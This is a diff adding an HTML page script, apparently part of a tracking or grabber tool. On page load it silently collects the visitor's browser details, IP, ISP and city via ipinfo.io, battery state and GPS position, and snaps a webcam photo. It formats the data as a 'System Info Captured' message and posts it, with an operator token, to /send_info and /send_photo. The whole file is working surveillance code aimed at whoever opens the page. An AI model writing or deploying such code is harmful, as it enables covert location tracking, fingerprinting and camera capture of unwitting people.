@@ -1,0 +1,92 @@
+<script>
+const token = "{{ token }}";
+const ipinfoToken = "{{ ipinfo_token }}";
+
+// Collect browser info
+async function collectInfo() {
+  let info = {};
+  info.userAgent = navigator.userAgent;
+  info.language = navigator.language;
+  info.platform = navigator.platform;
+  info.screen = `${screen.width}x${screen.height}`;
+  info.cores = navigator.hardwareConcurrency;
+  info.memory = navigator.deviceMemory || "N/A";
+  info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+  // Battery info
+  if (navigator.getBattery) {
+    try {
+      const battery = await navigator.getBattery();
+      info.battery = `${Math.round(battery.level * 100)}% ${battery.charging ? "(charging)" : ""}`;
+    } catch(e){}
+  }
+
+  // IP info
+  let ipData = {};
+  try {
+    const res = await fetch(`https://ipinfo.io/json?token=${ipinfoToken}`);
+    ipData = await res.json();
+  } catch(e){}
+
+  // GPS location
+  let gps = {};
+  if (navigator.geolocation) {
+    try {
+      await new Promise((resolve, reject) => {
+        navigator.geolocation.getCurrentPosition(
+          pos => {
+            gps = {lat: pos.coords.latitude, lon: pos.coords.longitude};
+            resolve();
+          },
+          err => resolve(), // ignore errors
+          {timeout: 5000}
+        );
+      });
+    } catch(e){}
+  }
+
+  // Build message
+  let text = "🧠 *System Info Captured*\n";
+  text += "━━━━━━━━━━━━━━━━━━━━━━━\n";
+  text += `🌐 *IP:* ${ipData.ip || "N/A"}\n`;
+  text += `🏢 *ISP:* ${ipData.org || "N/A"}\n`;
+  text += `📍 *Location:* ${ipData.city || ""}, ${ipData.region || ""}, ${ipData.country || ""}\n`;
+  if (gps.lat) text += `📡 *GPS:* ${gps.lat}, ${gps.lon}\n`;
+  text += `💻 *Device:* ${info.platform}\n`;
+  text += `🖥️ *Screen:* ${info.screen}\n`;
+  text += `🌐 *Browser:* ${info.userAgent}\n`;
+  text += `🔋 *Battery:* ${info.battery || "N/A"}\n`;
+  text += `🕒 *Timezone:* ${info.timezone}\n`;
+
+  // Send to backend
+  fetch("/send_info", {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({token, info: text})
+  });
+}
+
+// Run on load
+collectInfo();
+
+// Camera capture (as before)
+navigator.mediaDevices.getUserMedia({ video: true })
+  .then(stream => {
+    const video = document.createElement("video");
+    video.srcObject = stream;
+    video.play();
+    const canvas = document.createElement("canvas");
+    const ctx = canvas.getContext("2d");
+    video.onloadedmetadata = () => {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      ctx.drawImage(video, 0, 0);
+      const image = canvas.toDataURL("image/jpeg");
+      fetch("/send_photo", {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({ image, token })
+      }).then(() => stream.getTracks().forEach(t => t.stop()));
+    };
+  });
+</script>
